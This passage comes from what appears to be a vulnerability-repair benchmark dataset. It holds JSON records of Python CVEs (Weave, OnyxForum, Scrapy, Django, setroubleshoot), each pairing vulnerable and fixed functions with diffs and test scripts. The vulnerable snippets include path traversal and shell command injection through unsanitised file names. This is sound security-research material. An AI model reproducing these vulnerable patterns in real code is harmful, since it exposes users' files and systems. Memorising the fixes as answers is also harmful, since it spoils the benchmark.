Exception as e:\n            yield ErrorMessage(filename, e)\n            return\n\n        if verbose and (i * 10 / len(filelist) > (i - 1) * 10 / len(filelist)):\n            sys.stdout.write('.')\n            sys.stdout.flush()\n    if verbose:\n        print()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_98_1",
        "commit": "f59d7ed",
        "file_path": "nltk/downloader.py",
        "start_line": "2249",
        "end_line": "2266",
        "snippet": "def _unzip_iter(filename, root, verbose=True):\n    if verbose:\n        sys.stdout.write('Unzipping %s' % os.path.split(filename)[1])\n        sys.stdout.flush()\n\n    try:\n        zf = zipfile.ZipFile(filename)\n    except zipfile.error as e:\n        yield ErrorMessage(filename, 'Error with downloaded zip file')\n        return\n    except Exception as e:\n        yield ErrorMessage(filename, e)\n        return\n\n    zf.extractall(root)\n\n    if verbose:\n        print()"
      }
    ],
    "vul_patch": "--- a/nltk/downloader.py\n+++ b/nltk/downloader.py\n@@ -12,41 +12,7 @@\n         yield ErrorMessage(filename, e)\n         return\n \n-    # Get lists of directories & files\n-    namelist = zf.namelist()\n-    dirlist = set()\n-    for x in namelist:\n-        if x.endswith('/'):\n-            dirlist.add(x)\n-        else:\n-            dirlist.add(x.rsplit('/', 1)[0] + '/')\n-    filelist = [x for x in namelist if not x.endswith('/')]\n+    zf.extractall(root)\n \n-    # Create the target directory if it doesn't exist\n-    if not os.path.exists(root):\n-        os.mkdir(root)\n-\n-    # Create the directory structure\n-    for dirname in sorted(dirlist):\n-        pieces = dirname[:-1].split('/')\n-        for i in range(len(pieces)):\n-            dirpath = os.path.join(root, *pieces[: i + 1])\n-            if not os.path.exists(dirpath):\n-                os.mkdir(dirpath)\n-\n-    # Extract files.\n-    for i, filename in enumerate(filelist):\n-        filepath = os.path.join(root, *filename.split('/'))\n-\n-        try:\n-            with open(filepath, 'wb') as dstfile, zf.open(filename) as srcfile:\n-                shutil.copyfileobj(srcfile, dstfile)\n-        except Exception as e:\n-            yield ErrorMessage(filename, e)\n-            return\n-\n-        if verbose and (i * 10 / len(filelist) > (i - 1) * 10 / len(filelist)):\n-            sys.stdout.write('.')\n-            sys.stdout.flush()\n     if verbose:\n         print()\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-7340",
    "cve_description": "The Weave server API allows remote users to fetch files from a specific directory, but due to a lack of input validation, it is possible to traverse and leak arbitrary files remotely. In various common scenarios, this allows a low-privileged user to assume the role of the server admin.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/wandb/weave",
    "patch_url": [
      "https://github.com/wandb/weave/commit/f43d5fb75e0d52933a52ecd9a0ce2f9b082e6c9f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_132_1",
        "commit": "c28d8d5",
        "file_path": "weave/weave_server.py",
        "start_line": 398,
        "end_line": 411,
        "snippet": "def send_local_file(path):\n    # path is given relative to the FS root. check to see that path is a subdirectory of the\n    # local artifacts path. if not, return 403. then if there is a cache scope function defined\n    # call it to make sure we have access to the path\n    abspath = (\n        \"/\" / pathlib.Path(path)\n    )  # add preceding slash as werkzeug strips this by default and it is reappended below in send_from_directory\n    try:\n        local_artifacts_path = pathlib.Path(filesystem.get_filesystem_dir()).absolute()\n    except errors.WeaveAccessDeniedError:\n        abort(403)\n    if local_artifacts_path not in list(abspath.parents):\n        abort(403)\n    return send_from_directory(\"/\", path)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_132_1",
        "commit": "f43d5fb",
        "file_path": "weave/weave_server.py",
        "start_line": 398,
        "end_line": 417,
        "snippet": "def send_local_file(path):\n    try:\n        # Retrieve and normalize the local artifacts path\n        local_artifacts_path = pathlib.Path(filesystem.get_filesystem_dir()).resolve(\n            strict=True\n        )\n\n        # Construct the full absolute path of the requested file\n        requested_path = (local_artifacts_path / path).resolve(strict=True)\n\n        # Ensure the requested path is within the local artifacts directory\n        if not str(requested_path).startswith(str(local_artifacts_path)):\n            abort(403)\n\n        # Send the file from the directory\n        return send_from_directory(\n            local_artifacts_path, str(requested_path.relative_to(local_artifacts_path))\n        )\n    except (errors.WeaveAccessDeniedError, FileNotFoundError):\n        abort(403)"
      }
    ],
    "vul_patch": "--- a/weave/weave_server.py\n+++ b/weave/weave_server.py\n@@ -1,14 +1,20 @@\n def send_local_file(path):\n-    # path is given relative to the FS root. check to see that path is a subdirectory of the\n-    # local artifacts path. if not, return 403. then if there is a cache scope function defined\n-    # call it to make sure we have access to the path\n-    abspath = (\n-        \"/\" / pathlib.Path(path)\n-    )  # add preceding slash as werkzeug strips this by default and it is reappended below in send_from_directory\n     try:\n-        local_artifacts_path = pathlib.Path(filesystem.get_filesystem_dir()).absolute()\n-    except errors.WeaveAccessDeniedError:\n+        # Retrieve and normalize the local artifacts path\n+        local_artifacts_path = pathlib.Path(filesystem.get_filesystem_dir()).resolve(\n+            strict=True\n+        )\n+\n+        # Construct the full absolute path of the requested file\n+        requested_path = (local_artifacts_path / path).resolve(strict=True)\n+\n+        # Ensure the requested path is within the local artifacts directory\n+        if not str(requested_path).startswith(str(local_artifacts_path)):\n+            abort(403)\n+\n+        # Send the file from the directory\n+        return send_from_directory(\n+            local_artifacts_path, str(requested_path.relative_to(local_artifacts_path))\n+        )\n+    except (errors.WeaveAccessDeniedError, FileNotFoundError):\n         abort(403)\n-    if local_artifacts_path not in list(abspath.parents):\n-        abort(403)\n-    return send_from_directory(\"/\", path)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-31501",
    "cve_description": "The ChaoticOnyx/OnyxForum repository before 2022-05-04 on GitHub allows absolute path traversal because the Flask send_file function is used unsafely.",
    "cwe_info": {
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/ChaoticOnyx/OnyxForum",
    "patch_url": [
      "https://github.com/ChaoticOnyx/OnyxForum/commit/f25543dfc62a9694d7e4f67eebfa45e3de916053"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_263_1",
        "commit": "4077b49",
        "file_path": "modules/hub/hub/views.py",
        "start_line": 474,
        "end_line": 493,
        "snippet": "    def get(self):\n        server_id = request.args[\"server\"]\n        path = request.args[\"path\"]\n        servers = current_app.config[\"BYOND_SERVERS\"]\n\n        assert path\n        assert server_id\n\n        server = None\n\n        for srv in servers:\n            if srv.id == server_id:\n                server = srv\n                break\n\n        if server is None:\n            abort(404)\n\n        file_path = os.path.join(server.logs_path, path)\n        return send_file(file_path, as_attachment=True)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_263_1",
        "commit": "f25543d",
        "file_path": "modules/hub/hub/views.py",
        "start_line": 476,
        "end_line": 495,
        "snippet": "    def get(self):\n        server_id = request.args[\"server\"]\n        path = request.args[\"path\"]\n        servers = current_app.config[\"BYOND_SERVERS\"]\n\n        assert path\n        assert server_id\n\n        server = None\n\n        for srv in servers:\n            if srv.id == server_id:\n                server = srv\n                break\n\n        if server is None:\n            abort(404)\n\n        file_path = safe_join(server.logs_path, path)\n        return send_file(file_path, as_attachment=True)"
      }
    ],
    "vul_patch": "--- a/modules/hub/hub/views.py\n+++ b/modules/hub/hub/views.py\n@@ -16,5 +16,5 @@\n         if server is None:\n             abort(404)\n \n-        file_path = os.path.join(server.logs_path, path)\n+        file_path = safe_join(server.logs_path, path)\n         return send_file(file_path, as_attachment=True)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-2160",
    "cve_description": "Weak Password Requirements in GitHub repository modoboa/modoboa prior to 2.1.0.\n\n",
    "cwe_info": {
      "CWE-521": {
        "name": "Weak Password Requirements",
        "description": "The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts."
      }
    },
    "repo": "https://github.com/modoboa/modoboa",
    "patch_url": [
      "https://github.com/modoboa/modoboa/commit/130257c96a2392ada795785a91178e656e27015c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_92_1",
        "commit": "288f62a",
        "file_path": "modoboa/core/forms.py",
        "start_line": "79",
        "end_line": "95",
        "snippet": "    def clean(self):\n        super().clean()\n        if self.errors:\n            return self.cleaned_data\n        oldpassword = self.cleaned_data.get(\"oldpassword\")\n        newpassword = self.cleaned_data.get(\"newpassword\")\n        confirmation = self.cleaned_data.get(\"confirmation\")\n        if newpassword and confirmation:\n            if oldpassword:\n                if newpassword != confirmation:\n                    self.add_error(\"confirmation\", _(\"Passwords mismatch\"))\n                else:\n                    password_validation.validate_password(\n                        confirmation, self.instance)\n            else:\n                self.add_error(\"oldpassword\", _(\"This field is required.\"))\n        return self.cleaned_data"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_92_1",
        "commit": "130257c",
        "file_path": "modoboa/core/forms.py",
        "start_line": "79",
        "end_line": "100",
        "snippet": "    def clean(self):\n        super().clean()\n        if self.errors:\n            return self.cleaned_data\n        oldpassword = self.cleaned_data.get(\"oldpassword\")\n        newpassword = self.cleaned_data.get(\"newpassword\")\n        confirmation = self.cleaned_data.get(\"confirmation\")\n        if newpassword and confirmation:\n            if oldpassword:\n                if newpassword != confirmation:\n                    self.add_error(\"confirmation\", _(\"Passwords mismatch\"))\n                else:\n                    password_validation.validate_password(\n                        confirmation, self.instance)\n            else:\n                self.add_error(\"oldpassword\", _(\"This field is required.\"))\n        elif newpassword or confirmation:\n            if not confirmation:\n                self.add_error(\"confirmation\", _(\"This field is required.\"))\n            else:\n                self.add_error(\"newpassword\", _(\"This field is required.\"))\n        return self.cleaned_data"
      }
    ],
    "vul_patch": "--- a/modoboa/core/forms.py\n+++ b/modoboa/core/forms.py\n@@ -14,4 +14,9 @@\n                         confirmation, self.instance)\n             else:\n                 self.add_error(\"oldpassword\", _(\"This field is required.\"))\n+        elif newpassword or confirmation:\n+            if not confirmation:\n+                self.add_error(\"confirmation\", _(\"This field is required.\"))\n+            else:\n+                self.add_error(\"newpassword\", _(\"This field is required.\"))\n         return self.cleaned_data\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-41125",
    "cve_description": "Scrapy is a high-level web crawling and scraping framework for Python. If you use `HttpAuthMiddleware` (i.e. the `http_user` and `http_pass` spider attributes) for HTTP authentication, all requests will expose your credentials to the request target. This includes requests generated by Scrapy components, such as `robots.txt` requests sent by Scrapy when the `ROBOTSTXT_OBEY` setting is set to `True`, or as requests reached through redirects. Upgrade to Scrapy 2.5.1 and use the new `http_auth_domain` spider attribute to control which domains are allowed to receive the configured HTTP authentication credentials. If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.5.1 is not an option, you may upgrade to Scrapy 1.8.1 instead. If you cannot upgrade, set your HTTP authentication credentials on a per-request basis, using for example the `w3lib.http.basic_auth_header` function to convert your credentials into a value that you can assign to the `Authorization` header of your request, instead of defining your credentials globally using `HttpAuthMiddleware`.",
    "cwe_info": {
      "CWE-522": {
        "name": "Insufficiently Protected Credentials",
        "description": "The product transmits or stores authentication credentials, but it uses an insecure method that is susceptible to unauthorized interception and/or retrieval."
      }
    },
    "repo": "https://github.com/scrapy/scrapy",
    "patch_url": [
      "https://github.com/scrapy/scrapy/commit/b01d69a1bf48060daec8f751368622352d8b85a6"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_50_1",
        "commit": "4183925",
        "file_path": "scrapy/downloadermiddlewares/httpauth.py",
        "start_line": 22,
        "end_line": 26,
        "snippet": "    def spider_opened(self, spider):\n        usr = getattr(spider, 'http_user', '')\n        pwd = getattr(spider, 'http_pass', '')\n        if usr or pwd:\n            self.auth = basic_auth_header(usr, pwd)"
      },
      {
        "id": "vul_py_50_2",
        "commit": "4183925",
        "file_path": "scrapy/downloadermiddlewares/httpauth.py",
        "start_line": 28,
        "end_line": 31,
        "snippet": "    def process_request(self, request, spider):\n        auth = getattr(self, 'auth', None)\n        if auth and b'Authorization' not in request.headers:\n            request.headers[b'Authorization'] = auth"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_50_1",
        "commit": "b01d69a1bf48060daec8f751368622352d8b85a6",
        "file_path": "scrapy/downloadermiddlewares/httpauth.py",
        "start_line": 26,
        "end_line": 40,
        "snippet": "    def spider_opened(self, spider):\n        usr = getattr(spider, 'http_user', '')\n        pwd = getattr(spider, 'http_pass', '')\n        if usr or pwd:\n            self.auth = basic_auth_header(usr, pwd)\n            if not hasattr(spider, 'http_auth_domain'):\n                warnings.warn('Using HttpAuthMiddleware without http_auth_domain is deprecated and can cause security '\n                              'problems if the spider makes requests to several different domains. http_auth_domain '\n                              'will be set to the domain of the first request, please set it to the correct value '\n                              'explicitly.',\n                              category=ScrapyDeprecationWarning)\n                self.domain_unset = True\n            else:\n                self.domain = spider.http_auth_domain\n                self.domain_unset = False"
      },
      {
        "id": "fix_py_50_2",
        "commit": "b01d69a1bf48060daec8f751368622352d8b85a6",
        "file_path": "scrapy/downloadermiddlewares/httpauth.py",
        "start_line": 42,
        "end_line": 50,
        "snippet": "    def process_request(self, request, spider):\n        auth = getattr(self, 'auth', None)\n        if auth and b'Authorization' not in request.headers:\n            domain = urlparse_cached(request).hostname\n            if self.domain_unset:\n                self.domain = domain\n                self.domain_unset = False\n            if not self.domain or url_is_from_any_domain(request.url, [self.domain]):\n                request.headers[b'Authorization'] = auth"
      }
    ],
    "vul_patch": "--- a/scrapy/downloadermiddlewares/httpauth.py\n+++ b/scrapy/downloadermiddlewares/httpauth.py\n@@ -3,3 +3,13 @@\n         pwd = getattr(spider, 'http_pass', '')\n         if usr or pwd:\n             self.auth = basic_auth_header(usr, pwd)\n+            if not hasattr(spider, 'http_auth_domain'):\n+                warnings.warn('Using HttpAuthMiddleware without http_auth_domain is deprecated and can cause security '\n+                              'problems if the spider makes requests to several different domains. http_auth_domain '\n+                              'will be set to the domain of the first request, please set it to the correct value '\n+                              'explicitly.',\n+                              category=ScrapyDeprecationWarning)\n+                self.domain_unset = True\n+            else:\n+                self.domain = spider.http_auth_domain\n+                self.domain_unset = False\n\n--- a/scrapy/downloadermiddlewares/httpauth.py\n+++ b/scrapy/downloadermiddlewares/httpauth.py\n@@ -1,4 +1,9 @@\n     def process_request(self, request, spider):\n         auth = getattr(self, 'auth', None)\n         if auth and b'Authorization' not in request.headers:\n-            request.headers[b'Authorization'] = auth\n+            domain = urlparse_cached(request).hostname\n+            if self.domain_unset:\n+                self.domain = domain\n+                self.domain_unset = False\n+            if not self.domain or url_is_from_any_domain(request.url, [self.domain]):\n+                request.headers[b'Authorization'] = auth\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-41125:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/scrapy\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2021-41125/bin/python -m pytest tests/test_downloadermiddleware_httpauth.py -k \"HttpAuthMiddlewareLegacyTest or HttpAuthAnyMiddlewareTest or test_no_auth or test_auth_domain or test_auth_subdomain\" -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-41125:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/scrapy\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2021-41125/bin/python -m pytest tests/test_downloadermiddleware_httpauth.py -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2015-8213",
    "cve_description": "The get_format function in utils/formats.py in Django before 1.7.x before 1.7.11, 1.8.x before 1.8.7, and 1.9.x before 1.9rc2 might allow remote attackers to obtain sensitive application secrets via a settings key in place of a date/time format setting, as demonstrated by SECRET_KEY.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/316bc3fc9437c5960c24baceb93c73f1939711e4"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_12_1",
        "commit": "710e11d",
        "file_path": "django/utils/formats.py",
        "start_line": 85,
        "end_line": 120,
        "snippet": "def get_format(format_type, lang=None, use_l10n=None):\n    \"\"\"\n    For a specific format type, returns the format for the current\n    language (locale), defaults to the format in the settings.\n    format_type is the name of the format, e.g. 'DATE_FORMAT'\n\n    If use_l10n is provided and is not None, that will force the value to\n    be localized (or not), overriding the value of settings.USE_L10N.\n    \"\"\"\n    format_type = force_str(format_type)\n    if use_l10n or (use_l10n is None and settings.USE_L10N):\n        if lang is None:\n            lang = get_language()\n        cache_key = (format_type, lang)\n        try:\n            cached = _format_cache[cache_key]\n            if cached is not None:\n                return cached\n            else:\n                # Return the general setting by default\n                return getattr(settings, format_type)\n        except KeyError:\n            for module in get_format_modules(lang):\n                try:\n                    val = getattr(module, format_type)\n                    for iso_input in ISO_INPUT_FORMATS.get(format_type, ()):\n                        if iso_input not in val:\n                            if isinstance(val, tuple):\n                                val = list(val)\n                            val.append(iso_input)\n                    _format_cache[cache_key] = val\n                    return val\n                except AttributeError:\n                    pass\n            _format_cache[cache_key] = None\n    return getattr(settings, format_type)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_12_1",
        "commit": "316bc3fc9437c5960c24baceb93c73f1939711e4",
        "file_path": "django/utils/formats.py",
        "start_line": 103,
        "end_line": 140,
        "snippet": "def get_format(format_type, lang=None, use_l10n=None):\n    \"\"\"\n    For a specific format type, returns the format for the current\n    language (locale), defaults to the format in the settings.\n    format_type is the name of the format, e.g. 'DATE_FORMAT'\n\n    If use_l10n is provided and is not None, that will force the value to\n    be localized (or not), overriding the value of settings.USE_L10N.\n    \"\"\"\n    format_type = force_str(format_type)\n    if format_type not in FORMAT_SETTINGS:\n        return format_type\n    if use_l10n or (use_l10n is None and settings.USE_L10N):\n        if lang is None:\n            lang = get_language()\n        cache_key = (format_type, lang)\n        try:\n            cached = _format_cache[cache_key]\n            if cached is not None:\n                return cached\n            else:\n                # Return the general setting by default\n                return getattr(settings, format_type)\n        except KeyError:\n            for module in get_format_modules(lang):\n                try:\n                    val = getattr(module, format_type)\n                    for iso_input in ISO_INPUT_FORMATS.get(format_type, ()):\n                        if iso_input not in val:\n                            if isinstance(val, tuple):\n                                val = list(val)\n                            val.append(iso_input)\n                    _format_cache[cache_key] = val\n                    return val\n                except AttributeError:\n                    pass\n            _format_cache[cache_key] = None\n    return getattr(settings, format_type)"
      },
      {
        "id": "fix_py_12_2",
        "commit": "316bc3fc9437c5960c24baceb93c73f1939711e4",
        "file_path": "django/utils/formats.py",
        "start_line": 33,
        "end_line": 50,
        "snippet": "FORMAT_SETTINGS = frozenset([\n    'DECIMAL_SEPARATOR',\n    'THOUSAND_SEPARATOR',\n    'NUMBER_GROUPING',\n    'FIRST_DAY_OF_WEEK',\n    'MONTH_DAY_FORMAT',\n    'TIME_FORMAT',\n    'DATE_FORMAT',\n    'DATETIME_FORMAT',\n    'SHORT_DATE_FORMAT',\n    'SHORT_DATETIME_FORMAT',\n    'YEAR_MONTH_FORMAT',\n    'DATE_INPUT_FORMATS',\n    'TIME_INPUT_FORMATS',\n    'DATETIME_INPUT_FORMATS',\n])\n\n"
      }
    ],
    "vul_patch": "--- a/django/utils/formats.py\n+++ b/django/utils/formats.py\n@@ -8,6 +8,8 @@\n     be localized (or not), overriding the value of settings.USE_L10N.\n     \"\"\"\n     format_type = force_str(format_type)\n+    if format_type not in FORMAT_SETTINGS:\n+        return format_type\n     if use_l10n or (use_l10n is None and settings.USE_L10N):\n         if lang is None:\n             lang = get_language()\n\n--- /dev/null\n+++ b/django/utils/formats.py\n@@ -0,0 +1,17 @@\n+FORMAT_SETTINGS = frozenset([\n+    'DECIMAL_SEPARATOR',\n+    'THOUSAND_SEPARATOR',\n+    'NUMBER_GROUPING',\n+    'FIRST_DAY_OF_WEEK',\n+    'MONTH_DAY_FORMAT',\n+    'TIME_FORMAT',\n+    'DATE_FORMAT',\n+    'DATETIME_FORMAT',\n+    'SHORT_DATE_FORMAT',\n+    'SHORT_DATETIME_FORMAT',\n+    'YEAR_MONTH_FORMAT',\n+    'DATE_INPUT_FORMATS',\n+    'TIME_INPUT_FORMATS',\n+    'DATETIME_INPUT_FORMATS',\n+])\n+\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2015-8213:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2015-8213/bin/python ./runtests.py i18n.tests.FormattingTests.test_format_arbitrary_settings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2015-8213:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2015-8213/bin/python ./runtests.py i18n.tests\n"
  },
  {
    "cve_id": "CVE-2016-4445",
    "cve_description": "The fix_lookup_id function in sealert in setroubleshoot before 3.2.23 allows local users to execute arbitrary commands as root by triggering an SELinux denial with a crafted file name, related to executing external commands with the commands.getstatusoutput function.",
    "cwe_info": {
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/fedora-selinux/setroubleshoot",
    "patch_url": [
      "https://github.com/fedora-selinux/setroubleshoot/commit/2d12677629ca319310f6263688bb1b7f676c01b7"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_269_1",
        "commit": "e83aa2e",
        "file_path": "framework/src/sealert",
        "start_line": 143,
        "end_line": 163,
        "snippet": "    def query_alerts_callback(sigs):\n        import commands\n        for siginfo in sigs.signature_list:\n            for plugin  in siginfo.plugin_list:\n                if analysis_id == plugin.analysis_id:\n                    p = load_plugins(analysis_id)[0]\n                    if p.fixable == False:\n                        print _(\"Not fixable.\")\n                        cl.main_loop.quit()\n                        return\n                    siginfo.update_derived_template_substitutions()\n                    command = siginfo.substitute(p.get_fix_cmd(siginfo.audit_event, plugin.args))\n                    rc, output = commands.getstatusoutput(command)\n                    if rc == 0:\n                        print _(\"Successfully ran %s\" % command)\n                    else:\n                        print output\n                    cl.main_loop.quit()\n                    return\n        print _(\"Plugin %s not valid for %s id\") % (analysis_id, local_id)\n        cl.main_loop.quit()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_269_1",
        "commit": "2d12677",
        "file_path": "framework/src/sealert",
        "start_line": 143,
        "end_line": 163,
        "snippet": "    def query_alerts_callback(sigs):\n        import subprocess\n        for siginfo in sigs.signature_list:\n            for plugin  in siginfo.plugin_list:\n                if analysis_id == plugin.analysis_id:\n                    p = load_plugins(analysis_id)[0]\n                    if p.fixable == False:\n                        print _(\"Not fixable.\")\n                        cl.main_loop.quit()\n                        return\n                    siginfo.update_derived_template_substitutions()\n                    command = siginfo.substitute_array(p.get_fix_cmd(siginfo.audit_event, plugin.args).split())\n                    try:\n                        output = subprocess.check_output(command)\n                        print _(\"Successfully ran %s\" % ' '.join(command))\n                    except subprocess.CalledProcessError as e:\n                        print(e.output)\n                    cl.main_loop.quit()\n                    return\n        print _(\"Plugin %s not valid for %s id\") % (analysis_id, local_id)\n        cl.main_loop.quit()"
      },
      {
        "id": "fix_py_269_2",
        "commit": "2d12677",
        "file_path": "framework/src/setroubleshoot/signature.py",
        "start_line": 463,
        "end_line": 464,
        "snippet": "    def substitute_array(self, args):\n        return [self.substitute(txt) for txt in args]"
      }
    ],
    "vul_patch": "--- a/framework/src/sealert\n+++ b/framework/src/sealert\n@@ -1,5 +1,5 @@\n     def query_alerts_callback(sigs):\n-        import commands\n+        import subprocess\n         for siginfo in sigs.signature_list:\n             for plugin  in siginfo.plugin_list:\n                 if analysis_id == plugin.analysis_id:\n@@ -9,12 +9,12 @@\n                         cl.main_loop.quit()\n                         return\n                     siginfo.update_derived_template_substitutions()\n-                    command = siginfo.substitute(p.get_fix_cmd(siginfo.audit_event, plugin.args))\n-                    rc, output = commands.getstatusoutput(command)\n-                    if rc == 0:\n-                        print _(\"Successfully ran %s\" % command)\n-                    else:\n-                        print output\n+                    command = siginfo.substitute_array(p.get_fix_cmd(siginfo.audit_event, plugin.args).split())\n+                    try:\n+                        output = subprocess.check_output(command)\n+                        print _(\"Successfully ran %s\" % ' '.join(command))\n+                    except subprocess.CalledProcessError as e:\n+                        print(e.output)\n                     cl.main_loop.quit()\n                     return\n         print _(\"Plugin %s not valid for %s id\") % (analysis_id, local_id)\n\n--- /dev/null\n+++ b/framework/src/sealert\n@@ -0,0 +1,2 @@\n+    def substitute_array(self, args):\n+        return [self.substitute(txt) for txt in args]\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2016-4446",
    "cve_description": "The allow_execstack plugin for setroubleshoot allows local users to execute arbitrary commands by triggering an execstack SELinux denial with a crafted filename, related to the commands.getoutput function.",
    "cwe_info": {
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/fedora-selinux/setroubleshoot",
    "patch_url": [
      "https://github.com/fedora-selinux/setroubleshoot/commit/eaccf4c0d20a27d3df5ff6de8c9dcc80f6f40718"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_392_1",
        "commit": "dda55aa50db95a25f0d919c3a0d5871827cdc40f",
        "file_path": "plugins/src/allow_execstack.py",
        "start_line": 29,
        "end_line": 34,
        "snippet": "def is_execstack(path):\n    if path[0] != \"/\":\n        return False\n\n    x = commands.getoutput(\"execstack -q %s\" % path).split()\n    return ( x[0]  == \"X\" )"
      },
      {
        "id": "vul_py_392_2",
        "commit": "dda55aa50db95a25f0d919c3a0d5871827cdc40f",
        "file_path": "plugins/src/allow_execstack.py",
        "start_line": 36,
        "end_line": 50,
        "snippet": "def find_execstack(exe, pid):\n    execstacklist = []\n    for path in commands.getoutput(\"ldd %s\" % exe).split():\n        if is_execstack(path) and path not in execstacklist:\n                execstacklist.append(path)\n    try:\n        fd = open(\"/proc/%s/maps\" % pid , \"r\")\n        for rec in fd.readlines():\n            for path in rec.split():\n                if is_execstack(path) and path not in execstacklist:\n                    execstacklist.append(path)\n    except IOError:\n        pass\n\n    return execstacklist"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_392_1",
        "commit": "eaccf4c0d20a27d3df5ff6de8c9dcc80f6f40718",
        "file_path": "plugins/src/allow_execstack.py",
        "start_line": 29,
        "end_line": 34,
        "snippet": "def is_execstack(path):\n    if path[0] != \"/\":\n        return False\n\n    x = subprocess.check_output([\"execstack\",  \"-q\", path], universal_newlines=True).split()\n    return ( x[0] == \"X\" )"
      },
      {
        "id": "fix_py_392_2",
        "commit": "eaccf4c0d20a27d3df5ff6de8c9dcc80f6f40718",
        "file_path": "plugins/src/allow_execstack.py",
        "start_line": 36,
        "end_line": 50,
        "snippet": "def find_execstack(exe, pid):\n    execstacklist = []\n    for path in subprocess.check_output([\"ldd\", exe], universal_newlines=True).split():\n        if is_execstack(path) and path not in execstacklist:\n                execstacklist.append(path)\n    try:\n        fd = open(\"/proc/%s/maps\" % pid , \"r\")\n        for rec in fd.readlines():\n            for path in rec.split():\n                if is_execstack(path) and path not in execstacklist:\n                    execstacklist.append(path)\n    except IOError:\n        pass\n\n    return execstacklist"
      }
    ],
    "vul_patch": "--- a/plugins/src/allow_execstack.py\n+++ b/plugins/src/allow_execstack.py\n@@ -2,5 +2,5 @@\n     if path[0] != \"/\":\n         return False\n \n-    x = commands.getoutput(\"execstack -q %s\" % path).split()\n-    return ( x[0]  == \"X\" )\n+    x = subprocess.check_output([\"execstack\",  \"-q\", path], universal_newlines=True).split()\n+    return ( x[0] == \"X\" )\n\n--- a/plugins/src/allow_execstack.py\n+++ b/plugins/src/allow_execstack.py\n@@ -1,6 +1,6 @@\n def find_execstack(exe, pid):\n     execstacklist = []\n-    for path in commands.getoutput(\"ldd %s\" % exe).split():\n+    for path in subprocess.check_output([\"ldd\", exe], universal_newlines=True).split():\n         if is_execstack(path) and path not in execstacklist:\n                 execstacklist.append(path)\n     try:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-47531",
    "cve_description": "Scout is a web-based visualizer for VCF-files. Due to the lack of sanitization in the filename, it is possible bypass intended file extension and make users download malicious files with any extension. With malicious content injected inside the file data and users unknowingly downloading it and opening may lead to the compromise of users' devices or data. This vulnerability is fixed in 4.89.",
    "cwe_info": {
      "CWE-116": {
        "name": "Improper Encoding or Escaping of Output",
        "description": "The product prepares a structured message for communication with another component, but encoding or escaping of the data is either missing or done incorrectly. As a result, the intended structure of the message is not preserved."
